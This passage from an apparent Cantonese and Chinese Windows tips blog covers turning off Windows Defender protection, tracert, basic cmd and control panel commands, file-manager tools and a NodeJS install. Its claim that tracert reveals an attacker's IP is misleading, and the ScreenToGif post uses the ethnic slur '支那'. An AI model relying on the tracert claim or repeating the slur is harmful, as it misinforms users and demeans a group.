<h1 id="設定"><a href="#設定" class="headerlink" title="設定"></a>設定</h1><p>接下來我們需要將原本已開啟的防毒相關功能都關掉。</p>
<div class="note info flat">
    說明：以下操作一樣會需要使用 <code>系統管理員</code>。
</div>

<h2 id="開啟-設定"><a href="#開啟-設定" class="headerlink" title="開啟 設定"></a>開啟 <code>設定</code></h2><p>直接在左下角輸入 <code>設定</code> 尋找 <code>設定</code> 然後將他開啟。</p>
<img src="/2022/07/02/windows-10-off-the-fucking-windows-defender/9.png" class="">

<h2 id="更新與安全性"><a href="#更新與安全性" class="headerlink" title="更新與安全性"></a>更新與安全性</h2><p>點擊 <code>更新與安全性</code>。</p>
<img src="/2022/07/02/windows-10-off-the-fucking-windows-defender/10.png" class="">

<h2 id="Windows-安全性"><a href="#Windows-安全性" class="headerlink" title="Windows 安全性"></a>Windows 安全性</h2><p>點擊 <code>Windows 安全性</code>。</p>
<img src="/2022/07/02/windows-10-off-the-fucking-windows-defender/11.png" class="">

<h2 id="病毒與威脅防護"><a href="#病毒與威脅防護" class="headerlink" title="病毒與威脅防護"></a>病毒與威脅防護</h2><p>點擊 <code>病毒與威脅防護</code>。</p>
<img src="/2022/07/02/windows-10-off-the-fucking-windows-defender/12.png" class="">

<h3 id="病毒與威脅防護-管理設定"><a href="#病毒與威脅防護-管理設定" class="headerlink" title="病毒與威脅防護 (管理設定)"></a>病毒與威脅防護 (管理設定)</h3><p>點擊 <code>管理設定</code>。</p>
<img src="/2022/07/02/windows-10-off-the-fucking-windows-defender/13.png" class="">

<h3 id="病毒與威脅防護設定"><a href="#病毒與威脅防護設定" class="headerlink" title="病毒與威脅防護設定"></a>病毒與威脅防護設定</h3><p>將所有的已開啟項目全部關閉</p>
<div class="note warning flat">
    注意：需要使用 <code>系統管理員</code>。
</div>

<h4 id="病毒與威脅防護設定-未關閉前"><a href="#病毒與威脅防護設定-未關閉前" class="headerlink" title="病毒與威脅防護設定 (未關閉前)"></a>病毒與威脅防護設定 (未關閉前)</h4><p>下圖為預設的 Windows 防毒設定，我們需要將所有已 <code>開啟</code> 的都通通關掉。</p>
<img src="/2022/07/02/windows-10-off-the-fucking-windows-defender/14.png" class="">

<h4 id="病毒與威脅防護設定-己關閉後"><a href="#病毒與威脅防護設定-己關閉後" class="headerlink" title="病毒與威脅防護設定 (己關閉後)"></a>病毒與威脅防護設定 (己關閉後)</h4><p>下圖為關閉後的畫面。</p>
<img src="/2022/07/02/windows-10-off-the-fucking-windows-defender/15.png" class="">

<hr>
<h1 id="重新啟動電腦"><a href="#重新啟動電腦" class="headerlink" title="重新啟動電腦"></a>重新啟動電腦</h1><p>完成以上的步驟後，將電腦重新啟動，然後就成功了。</p>
<div class="note warning flat">
    注意：不是關機再啟動電腦，是重新啟動。
</div>

<img src="/2022/07/02/windows-10-off-the-fucking-windows-defender/g3.png" class="">


<h2 id="查看是否關閉成功"><a href="#查看是否關閉成功" class="headerlink" title="查看是否關閉成功"></a>查看是否關閉成功</h2><p>當成功的時候，開啟 <code>病毒與威脅防護</code> 後會顯示 <code>正在取得保護資訊...</code>，</p>
<img src="/2022/07/02/windows-10-off-the-fucking-windows-defender/g1.png" class="">

<p>然後就會顯示 <code>你的病毒與威脅防護是由您的組織所管理</code>。</p>
<img src="/2022/07/02/windows-10-off-the-fucking-windows-defender/g2.png" class="">]]></content>
      <categories>
        <category>Windows</category>
      </categories>
  </entry>
  <entry>
    <title>Windows - ScreenToGif 錄影畫面轉為 Gif 既工具</title>
    <url>/2022/01/18/windows-ScreenToGif/</url>
    <content><![CDATA[<img src="/2022/01/18/windows-ScreenToGif/logo.png" class="">

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有時淨係想將佢錄做 Gif，但又唔想咁煩又要轉檔又要乜乜柒柒咁？<br>又唔想下下用線上既工具？<br>唔緊要，我介紹一款工具俾你！</p>
<h2 id="ScreenToGif"><a href="#ScreenToGif" class="headerlink" title="ScreenToGif"></a>ScreenToGif</h2><ul>
<li>Open Soruce</li>
<li>簡單易用</li>
<li>為錄影 Gif 而設既工具</li>
<li>有免安裝版本 (Portable)</li>
<li>唔係支那製</li>
<li>作者有 Github</li>
<li>多功能</li>
</ul>
<h2 id="官網"><a href="#官網" class="headerlink" title="官網"></a>官網</h2><ul>
<li><a href="https://www.screentogif.com/">ScreenToGif</a></li>
<li><a href="https://github.com/NickeManarin/ScreenToGif">Github</a></li>
</ul>
<h2 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="/2022/01/18/windows-ScreenToGif/program.gif" class="">

<img src="/2022/01/18/windows-ScreenToGif/options.gif" class="">

<img src="/2022/01/18/windows-ScreenToGif/program-2.png" class="">

<img src="/2022/01/18/windows-ScreenToGif/program-3.png" class="">

<img src="/2022/01/18/windows-ScreenToGif/program-4.gif" class="">

<img src="/2022/01/18/windows-ScreenToGif/program-5.gif" class="">

<img src="/2022/01/18/windows-ScreenToGif/wtf.gif" class="">]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Gui</tag>
      </tags>
  </entry>
  <entry>
    <title>SpaceSniffer - 圖像化磁盤空間分析器 (Windows)</title>
    <url>/2022/02/08/windows-SpaceSniffer/</url>
    <content><![CDATA[<h1 id="SpaceSniffer"><a href="#SpaceSniffer" class="headerlink" title="SpaceSniffer"></a>SpaceSniffer</h1><p><a href="http://www.uderzo.it/main_products/space_sniffer/">SpaceSniffer</a> 是一個免費軟件（歡迎捐贈）和便攜式工具應用程序。<br>可讓您了解文件夾和文件在磁盤上的結構，<br>通過使用 Treemap 可視化佈局，您可以立即了解大文件夾和文件在設備上的位置。</p>
<p>【軟件名稱】：SpaceSniffer<br>【支援系統】：Windows 2000, Windows XP, Windows Vista, Windows 7, Winodows 8, Windows 10<br>【軟件語言】：英文<br>【官方網站】：<a href="http://www.uderzo.it/main_products/space_sniffer/">按這裡</a><br>【下載軟件】：<a href="https://www.fosshub.com/SpaceSniffer.html">按這裡</a></p>
<h2 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="/2022/02/08/windows-SpaceSniffer/program.png" class="">]]></content>
      <categories>
        <category>工具介紹</category>
      </categories>
  </entry>
  <entry>
    <title>Windows 指令 - Tracert 追蹤封包傳遞</title>
    <url>/2022/02/03/windows-commands-tracert/</url>
    <content><![CDATA[<h1 id="轉自-Microsoft"><a href="#轉自-Microsoft" class="headerlink" title="轉自 Microsoft"></a>轉自 Microsoft</h1><p>TRACERT 診斷公用程式會傳送「網際網路控制訊息通訊協定」(ICMP) 回應封包給目的地，以確定到目的地所經的路徑。 在這些封包中，TRACERT 會使用各種不同的 IP 存留時間 (Time-To-Live，TTL) 值。 因為路徑上的每台路由器在轉送封包之前必須至少將封包的 TTL 遞減 1，所以 TTL 其實就是一個躍點計數器。 當封包的 TTL 達到零 (0) 時，路由器會將 ICMP「超過時間」訊息傳回給來源電腦。</p>
<p>TRACERT 將 TTL 設為 1，來傳送第一個回應封包，之後每次傳輸都將 TTL 遞增 1，直到目的地回應或達到最大 TTL 為止。 中介路由器傳回的 ICMP「超過時間」訊息會顯示出路徑。 但是請注意，有些路由器會將 TTL 已經過期的封包悄悄丟棄，因此 TRACERT 不會察覺到這些封包。</p>
<p>TRACERT 會依序印出傳回 ICMP「超過時間」訊息的中介路由器清單。 搭配使用 -d 選項與 tracert 命令，可以指示 TRACERT 不要對每個 IP 位址執行 DNS 查閱，因此，TRACERT 會報告路由器近端介面的 IP 位址。</p>
<p>在下列 tracert 命令及其輸出的範例中，封包通過 2 台路由器 (157.54.48.1 和 11.1.0.67) 後到達主機 11.1.0.1。 在這個範例中，預設閘道是 157.54.48.1，而 11.1.0.0 網路上路由器的 IP 位址是 11.1.0.67。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:\&gt;tracert 11.1.0.1</span><br><span class="line">命令的輸出：</span><br><span class="line"></span><br><span class="line">Tracing route to 11.1.0.1 over a maximum of 30 hops</span><br><span class="line">---------------------------------------------------</span><br><span class="line">1 2 ms 3 ms 2 ms 157.54.48.1</span><br><span class="line">2 75 ms 83 ms 88 ms 11.1.0.67</span><br><span class="line">3 73 ms 79 ms 93 ms 11.1.0.1</span><br><span class="line"></span><br><span class="line">Trace complete.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="解釋"><a href="#解釋" class="headerlink" title="解釋"></a>解釋</h1><p>可能有人見到上面一大段野唔想睇，<br>咁等我簡短黎講。</p>
<p>以上指令既意思，<br>簡單黎講係，</p>
<p>當你連去 11.1.0.1 位置既時候，</p>
<p>你部機既 Network 係會先連去 157.54.48.1，<br>然後再去 11.1.0.67，<br>然後再最後去到 11.1.0.1。</p>
<p>講咁多，<br>Q: 咁呢個實際上俾到啲咩作用我㗎？<br>A: 我以 Hacking 角度去講</p>
<p>我以 Hacking 角度去講，<br>假設你而加部機俾人 hack 緊。</p>
<p>咁打完呢句野你會睇到對方既 ip。<br>咁好明顯你已經俾人 hack 緊。</p>
<p><a href="https://support.microsoft.com/zh-tw/topic/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8-tracert-%E7%96%91%E9%9B%A3%E6%8E%92%E8%A7%A3-windows-%E4%B8%AD%E7%9A%84-tcp-ip-%E5%95%8F%E9%A1%8C-e643d72b-2f4f-cdd6-09a0-fd2989c7ca8e">https://support.microsoft.com/zh-tw/topic/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8-tracert-%E7%96%91%E9%9B%A3%E6%8E%92%E8%A7%A3-windows-%E4%B8%AD%E7%9A%84-tcp-ip-%E5%95%8F%E9%A1%8C-e643d72b-2f4f-cdd6-09a0-fd2989c7ca8e</a></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows - 基本指令列表</title>
    <url>/2022/01/22/windows-commands/</url>
    <content><![CDATA[<h2 id="Set-Path"><a href="#Set-Path" class="headerlink" title="Set Path"></a>Set Path</h2><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">PATH</span>=<span class="variable">%PATH%</span>;D:\Program Files\Steam :: 將呢個 Paths <span class="built_in">set</span> 路徑</span><br></pre></td></tr></table></figure>


<h2 id="入Folder"><a href="#入Folder" class="headerlink" title="入Folder"></a>入Folder</h2><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> #進入</span><br><span class="line"><span class="built_in">cd</span> THISAV #進入THISAV Folder</span><br></pre></td></tr></table></figure>

<h2 id="出Folder"><a href="#出Folder" class="headerlink" title="出Folder"></a>出Folder</h2><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span>.. #退出一個Paths位置</span><br></pre></td></tr></table></figure>

<h2 id="起Folder"><a href="#起Folder" class="headerlink" title="起Folder"></a>起Folder</h2><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> #建立資料夾</span><br><span class="line"><span class="built_in">mkdir</span> AV #起個Folder叫 AV</span><br></pre></td></tr></table></figure>

<h2 id="del-Folder"><a href="#del-Folder" class="headerlink" title="del Folder"></a>del Folder</h2><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rmdir</span> #Delete資料夾</span><br><span class="line"><span class="built_in">rmdir</span> hi #delete左個叫hi既Folder</span><br></pre></td></tr></table></figure>

<h2 id="del-File"><a href="#del-File" class="headerlink" title="del File"></a>del File</h2><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">rm #delete野</span><br><span class="line">rm this.txt #delete左個叫this.txt既檔案</span><br></pre></td></tr></table></figure>

<h2 id="列出檔案"><a href="#列出檔案" class="headerlink" title="列出檔案"></a>列出檔案</h2><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">ls #List 有既 file folder</span><br></pre></td></tr></table></figure>

<h2 id="轉-Storage-位置"><a href="#轉-Storage-位置" class="headerlink" title="轉 Storage 位置"></a>轉 Storage 位置</h2><p>入其他Drive<br>當你要由D: 入F:</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="function">F:</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows - 使用指令開啟控制台或控制台中的程式</title>
    <url>/2022/01/09/windows-control/</url>
    <content><![CDATA[<img src="/img/Post/image/Windows/cover.svg" width="200px"/>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>其實我覺得慢慢撳出黎真係好撚哂時間，打指令快勁撚多囉。(港女 Mode xD)</p>
<h1 id="輸入指令開啟的控制台工具"><a href="#輸入指令開啟的控制台工具" class="headerlink" title="輸入指令開啟的控制台工具"></a>輸入指令開啟的控制台工具</h1><p>開啟你的 Terminal 或者 <kbd>Win <i class="fa-brands fa-windows"></i></kbd>+<kbd>R</kbd></p>
<blockquote>
<p>注意：如果您想要從命令提示字元執行命令，則必須從 Windows 資料夾執行。此外，請注意電腦中可能沒有本文列示的所有工具，因為您的 Windows 安裝可能不包括所有這些元件。</p>
</blockquote>
<h2 id="開啟控制台"><a href="#開啟控制台" class="headerlink" title="開啟控制台"></a>開啟控制台</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control</span><br></pre></td></tr></table></figure>

<h2 id="協助工具選項"><a href="#協助工具選項" class="headerlink" title="協助工具選項"></a>協助工具選項</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control access.cpl</span><br></pre></td></tr></table></figure>

<h2 id="新增-移除程式"><a href="#新增-移除程式" class="headerlink" title="新增/移除程式"></a>新增/移除程式</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control appwiz.cpl</span><br></pre></td></tr></table></figure>

<h2 id="日期-時間內容"><a href="#日期-時間內容" class="headerlink" title="日期/時間內容"></a>日期/時間內容</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control timedate.cpl</span><br></pre></td></tr></table></figure>
<h2 id="顯示設定"><a href="#顯示設定" class="headerlink" title="顯示設定"></a>顯示設定</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control desk.cpl</span><br></pre></td></tr></table></figure>

<h2 id="字型"><a href="#字型" class="headerlink" title="字型"></a>字型</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control fonts</span><br></pre></td></tr></table></figure>

<h2 id="網際網路"><a href="#網際網路" class="headerlink" title="網際網路"></a>網際網路</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control inetcpl.cpl</span><br></pre></td></tr></table></figure>

<h2 id="FindFast"><a href="#FindFast" class="headerlink" title="FindFast"></a>FindFast</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control findfast.cpl</span><br></pre></td></tr></table></figure>

<h2 id="搖桿內容-遊戲控制器"><a href="#搖桿內容-遊戲控制器" class="headerlink" title="搖桿內容 (遊戲控制器)"></a>搖桿內容 (遊戲控制器)</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control joy.cp</span><br></pre></td></tr></table></figure>

<h2 id="鍵盤內容"><a href="#鍵盤內容" class="headerlink" title="鍵盤內容"></a>鍵盤內容</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control main.cpl keyboard</span><br></pre></td></tr></table></figure>

<h2 id="滑鼠內容"><a href="#滑鼠內容" class="headerlink" title="滑鼠內容"></a>滑鼠內容</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control main.cpl</span><br></pre></td></tr></table></figure>

<h2 id="Microsoft-Exchange"><a href="#Microsoft-Exchange" class="headerlink" title="Microsoft Exchange"></a>Microsoft Exchange</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control mlcfg32.cpl</span><br></pre></td></tr></table></figure>

<h2 id="數據機內容"><a href="#數據機內容" class="headerlink" title="數據機內容"></a>數據機內容</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control modem.cpl</span><br></pre></td></tr></table></figure>

<h2 id="多媒體內容-聲音"><a href="#多媒體內容-聲音" class="headerlink" title="多媒體內容 (聲音)"></a>多媒體內容 (聲音)</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control mmsys.cpl</span><br></pre></td></tr></table></figure>

<h2 id="網路內容-網路連線-舊-Windows"><a href="#網路內容-網路連線-舊-Windows" class="headerlink" title="網路內容 (網路連線 舊 Windows)"></a>網路內容 (網路連線 舊 Windows)</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control netcpl.cpl</span><br></pre></td></tr></table></figure>

<h2 id="網路內容-網路連線-NT-4-0-Windows"><a href="#網路內容-網路連線-NT-4-0-Windows" class="headerlink" title="網路內容 (網路連線 NT 4.0 Windows)"></a>網路內容 (網路連線 NT 4.0 Windows)</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control ncpa.cpl</span><br></pre></td></tr></table></figure>

<h2 id="密碼內容"><a href="#密碼內容" class="headerlink" title="密碼內容"></a>密碼內容</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control password.cpl</span><br></pre></td></tr></table></figure>

<h2 id="電源選項"><a href="#電源選項" class="headerlink" title="電源選項"></a>電源選項</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control powercfg.cpl</span><br></pre></td></tr></table></figure>

<h2 id="裝置和印表機"><a href="#裝置和印表機" class="headerlink" title="裝置和印表機"></a>裝置和印表機</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control printers</span><br></pre></td></tr></table></figure>

<h2 id="地區"><a href="#地區" class="headerlink" title="地區"></a>地區</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control intl.cpl</span><br></pre></td></tr></table></figure>

<h2 id="掃描器與數位相機"><a href="#掃描器與數位相機" class="headerlink" title="掃描器與數位相機"></a>掃描器與數位相機</h2><p>注意：掃描器與數位相機小程式 (sticpl.cpl) 無法在 Windows Millennium 中執行。其已由掃描器與數位相機資料夾所取代，其功能類似印表機和撥號網路資料夾。</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control sticpl.cpl</span><br></pre></td></tr></table></figure>

<h2 id="系統內容"><a href="#系統內容" class="headerlink" title="系統內容"></a>系統內容</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">control sysdm.cpl</span><br></pre></td></tr></table></figure>

<p>參考資料 :<br><a href="https://support.microsoft.com/zh-tw/topic/%E5%A6%82%E4%BD%95%E8%97%89%E7%94%B1%E8%BC%B8%E5%85%A5%E6%8C%87%E4%BB%A4%E4%BE%86%E5%9F%B7%E8%A1%8C%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%B7%A5%E5%85%B7-bce95b4d-e8c2-1cd0-ee0d-027679d520a6">https://support.microsoft.com/zh-tw/topic/%E5%A6%82%E4%BD%95%E8%97%89%E7%94%B1%E8%BC%B8%E5%85%A5%E6%8C%87%E4%BB%A4%E4%BE%86%E5%9F%B7%E8%A1%8C%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%B7%A5%E5%85%B7-bce95b4d-e8c2-1cd0-ee0d-027679d520a6</a></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows - 預設程式名稱列表</title>
    <url>/2022/01/21/windows-default-program/</url>
    <content><![CDATA[<img src="/img/Post/image/Windows/cover.svg" width="200px"/>

<h1 id="Windows-程式"><a href="#Windows-程式" class="headerlink" title="Windows 程式"></a>Windows 程式</h1><p>左搵右搵個 Program 喺邊好哂時間，Search 出黎仲快，但係你要知道個程式名係咩，所以下面我會列出成日用到既 Program 名。</p>
<h1 id="檔案總管-Explorer"><a href="#檔案總管-Explorer" class="headerlink" title="檔案總管 Explorer"></a>檔案總管 Explorer</h1><pre><code>C:\Windows\explorer.exe
</code></pre>
<p><img src="explorer.gif"></p>
<h1 id="記事本-Notepad"><a href="#記事本-Notepad" class="headerlink" title="記事本 Notepad"></a>記事本 Notepad</h1><pre><code>C:\Windows\system32\notepad.exe 
</code></pre>
<p><img src="notepad.png"></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Gui</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows - 檔案總管程式</title>
    <url>/2022/01/14/windows-explorer-program/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>原本既 Windows Explorer 俾人 Block 左又或者覺得唔好用？<br>唔緊要，以下我介紹幾款程式都係 For Windows 既 Explorer！</p>
<h1 id="1-Portable-UltraExplorer"><a href="#1-Portable-UltraExplorer" class="headerlink" title="1. Portable UltraExplorer"></a>1. Portable UltraExplorer</h1><p>這是 UltraExplorer 的便攜式版本 - 一個文件管理實用程序，包括幾個有趣的功能。即使經驗不足的用戶也可以輕鬆操作該工具。</p>
<p>由於不需要安裝，您可以將 Portable UltraExplorer 放在可移動設備（如 USB 閃存驅動器）上，將其存儲在任何計算機上並直接運行其可執行文件。</p>
<p>此外，沒有對 Windows 註冊表進行任何修改，刪除後也找不到任何剩餘項目。</p>
<p>Portable UltraExplorer 的界麵類似於 Windows Explorer 的界面，不同之處在於該應用程序支持多個選項卡。</p>
<p>該應用程序包含許多工具欄；其中包括地址、主菜單、FavoriteCrumb、佈局、導航、驅動器、下拉堆棧和過濾欄。您可以啟用雙窗格列表視圖，將所選項目添加到收藏列表並選擇所有文件、文件夾或匹配文本。</p>
<p>此外，您可以使用高級搜索功能、展平文件夾、計算文件夾大小、在上下文菜單中集成 UltraExplorer、更改界面主題和語言以及自定義佈局。</p>
<p>從“選項”區域，您可以更改樹視圖和列表視圖的文本顏色和字體、啟用組著色、自定義列、設置縮略圖大小、配置鼠標手勢、禁止多個實例以及將應用程序設置為最小化到系統托盤。</p>
<p>文件管理器使用少量的 CPU 和系統內存。它具有良好的響應時間，包括用戶文檔，並且在我們的整個測試過程中沒有凍結、崩潰或彈出錯誤對話框。我們沒有遇到任何問題。便攜式 UltraExplorer 絕對值得考慮作為 Windows Explorer 或類似應用程序的替代品。 </p>
<h2 id="程或圖片"><a href="#程或圖片" class="headerlink" title="程或圖片"></a>程或圖片</h2><img src="/2022/01/14/windows-explorer-program/1.png" class="">
<img src="/2022/01/14/windows-explorer-program/2.png" class="">

<h2 id="下載"><a href="#下載" class="headerlink" title="下載"></a>下載</h2><ul>
<li><a href="https://www.softpedia.com/get/PORTABLE-SOFTWARE/System/File-management/Windows-Portable-Applications-Portable-UltraExplorer.shtml#sgal_6">Download</a></li>
</ul>
<h1 id="2-Explorer-Portable"><a href="#2-Explorer-Portable" class="headerlink" title="2. Explorer++ Portable"></a>2. Explorer++ Portable</h1><p>Explorer++ 是一個免費的多標籤文件管理器，具有與 Windows Explorer 相同的熟悉界面，同時引入了多項增強和改進，以提供更豐富的文件瀏覽體驗。</p>
<ul>
<li>選項卡式瀏覽，便於管理多個文件夾。</li>
<li>顯示窗口顯示文件被選中時的預覽。</li>
<li>易於記憶的鍵盤快捷鍵，用於快速導航。</li>
<li>可定制的用戶界面。</li>
<li>對其他應用程序的完全拖放支持，包括 Windows 資源管理器。</li>
<li>支持合併和拆分等高級文件操作。</li>
<li>32 位和 64 位版本組合成一個自動包。</li>
</ul>
<h2 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="/2022/01/14/windows-explorer-program/++1.png" class="">


<h2 id="下載-1"><a href="#下載-1" class="headerlink" title="下載"></a>下載</h2><ul>
<li><a href="https://www.softpedia.com/get/PORTABLE-SOFTWARE/System/File-management/Windows-Portable-Applications-Portable-UltraExplorer.shtml#sgal_6">Download</a></li>
</ul>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Gui</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows 檔案總管 - Files</title>
    <url>/2022/02/01/windows-files-file-manager/</url>
    <content><![CDATA[<img src="/2022/02/01/windows-files-file-manager/logo.png" class="">

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>原生既 Explorer (檔案總管) 覺得唔太好用，</p>
<p>之前介紹既都唔岩你心水？<br>想睇返可以撳呢條 link<br><a href="/2022/01/14/windows-explorer-program/">撳我睇舊 Post</a></p>
<p>想特別啲，但又搵唔到其他選擇？<br>呢個時候，你可以考慮下呢款 ！<br><a href="https://github.com/files-community/Files">Files</a></p>
<h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><ul>
<li><a href="https://github.com/files-community/Files">https://github.com/files-community/Files</a></li>
</ul>
<h2 id="官網"><a href="#官網" class="headerlink" title="官網"></a>官網</h2><ul>
<li><a href="https://files.community/">https://files.community/</a></li>
</ul>
<h2 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h2><p>根據官方提供既方法係有幾種，</p>
<ol>
<li>自己用 Visual Studio 2022 Build (需要 裝 Visual Studio 2022)</li>
<li>用 Winget Package Manager Download (打一句指令)</li>
<li>Microsoft Store 下載 (最易既下載方法)</li>
</ol>
<h3 id="方法一下載-VS-2022"><a href="#方法一下載-VS-2022" class="headerlink" title="方法一下載 (VS 2022)"></a>方法一下載 (VS 2022)</h3><p>To build the app in development mode, open the sln file in Visual Studio (Files.sln) and set the Files.Package project as the startup item by right-clicking on Files.Package in the solution explorer &amp; hitting ‘Set as Startup item’.</p>
<img src="/2022/02/01/windows-files-file-manager/hi.png" class="">

<h3 id="方法三下載-Microsoft-Store"><a href="#方法三下載-Microsoft-Store" class="headerlink" title="方法三下載 (Microsoft Store)"></a>方法三下載 (Microsoft Store)</h3><p><a href="https://www.microsoft.com/zh-tw/p/files-modern-file-manager/9nghp3dx8hdx?rtc=1&amp;activetab=pivot:overviewtab">https://www.microsoft.com/zh-tw/p/files-modern-file-manager/9nghp3dx8hdx?rtc=1&amp;activetab=pivot:overviewtab</a></p>
<p>撳取得，等，開啟。</p>
<h3 id="方法三下載-Winget"><a href="#方法三下載-Winget" class="headerlink" title="方法三下載 (Winget)"></a>方法三下載 (Winget)</h3><p>Windows 10 原本係裝左 <a href="https://github.com/microsoft/winget-cli">winget</a> 既。</p>
<p>只需要開 Terminal 打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">winget install -e 9NGHP3DX8HDX</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Gui</tag>
      </tags>
  </entry>
  <entry>
    <title>NodeJS - 安裝於 Windows 系統內</title>
    <url>/2022/06/26/windows-install-nodejs/</url>
    <content><![CDATA[<img src="/img/Post/image/nodejs/logo.svg" width="200px"/>

<h1 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h1><p>Node.js 是一個開源、跨平台、後端的 JavaScript 運行環境，運行在 V8 引擎上，並在 Web 瀏覽器之外執行 JavaScript 代碼，構建可擴展的網絡應用程序。</p>
<p>【官方網站】：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a><br>【程式語言】：英文<br>【支援系統】：Windows, Mac, Linux</p>
<h1 id="下載-NodeJS-安裝檔案"><a href="#下載-NodeJS-安裝檔案" class="headerlink" title="下載 NodeJS 安裝檔案"></a>下載 NodeJS 安裝檔案</h1><p>請於上方開啟官方網站連結後，於下圖中選擇下載 LTS 版本的 NodeJS (圈內)。</p>
<div class="note info flat">
    說明 : 左邊所說的 <code>LTS</code> 意思為隱定版本，右邊的 <code>Current</code> 為現時最新版版，但是不隱定。
</div>

<img src="/2022/06/26/windows-install-nodejs/1.png" class="">

<h1 id="安裝-NodeJS"><a href="#安裝-NodeJS" class="headerlink" title="安裝 NodeJS"></a>安裝 NodeJS</h1><p>開啟下載後的檔案。</p>
<div class="note info flat">
    說明 : 安裝檔案需要使用 <code>系統管理員</code> 身份開啟。
</div>

<hr>
<h2 id="Setup-Wizard"><a href="#Setup-Wizard" class="headerlink" title="Setup Wizard"></a>Setup Wizard</h2><p>來到這畫面，直接按下 <code>Next</code>。</p>
<img src="/2022/06/26/windows-install-nodejs/2.png" class="">

<h2 id="License-Agreement"><a href="#License-Agreement" class="headerlink" title="License Agreement"></a>License Agreement</h2><p>將 <code>i accept the terms in the License Agreement</code> Tick 後按下 <code>Next</code>。</p>
<img src="/2022/06/26/windows-install-nodejs/3.png" class="">

<h2 id="選擇安裝路徑"><a href="#選擇安裝路徑" class="headerlink" title="選擇安裝路徑"></a>選擇安裝路徑</h2><p>這邊我用預設的位置，如果你想改的話再在這邊改。</p>
<img src="/2022/06/26/windows-install-nodejs/4.png" class="">

<h2 id="選擇安裝東西"><a href="#選擇安裝東西" class="headerlink" title="選擇安裝東西"></a>選擇安裝東西</h2><p>這邊我是會所有都安裝，直接按下 <code>Next</code>。</p>
<img src="/2022/06/26/windows-install-nodejs/5.png" class="">

<h2 id="Native-Modules"><a href="#Native-Modules" class="headerlink" title="Native Modules"></a>Native Modules</h2><p>有些 NPM 套件會需要使用 C/C++ Compiled，如果你需要的話請安裝。</p>
<div class="note warning flat">
    注意：如果你安裝了會自動安裝 <code>Chocolatey</code>。
</div>

<img src="/2022/06/26/windows-install-nodejs/6.png" class="">

<h2 id="準備安裝"><a href="#準備安裝" class="headerlink" title="準備安裝"></a>準備安裝</h2><p>確定以上的設置後，按 <code>Install</code>。</p>
<img src="/2022/06/26/windows-install-nodejs/7.png" class="">

<h2 id="安裝中-…"><a href="#安裝中-…" class="headerlink" title="安裝中 …"></a>安裝中 …</h2><p>在此期間，靜心等待他完成安裝。</p>
<img src="/2022/06/26/windows-install-nodejs/8.png" class="">

